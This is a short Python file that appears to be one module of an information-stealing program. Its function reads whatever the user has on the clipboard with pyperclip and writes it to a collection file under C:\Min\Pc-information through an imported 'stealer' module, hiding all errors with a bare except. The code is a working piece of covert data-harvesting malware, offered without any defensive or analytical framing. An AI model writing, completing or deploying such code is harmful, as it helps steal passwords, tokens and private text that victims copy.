import pyperclip
import stealer

def get_bufer():
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            stealer.write_in_bufer("C:\\Min\\Pc-information\\bufer.txt", clipboard_content)
        else:
            stealer.write_in_bufer("C:\\Min\\Pc-information\\bufer.txt", "buffer is empty")
    except:
        pass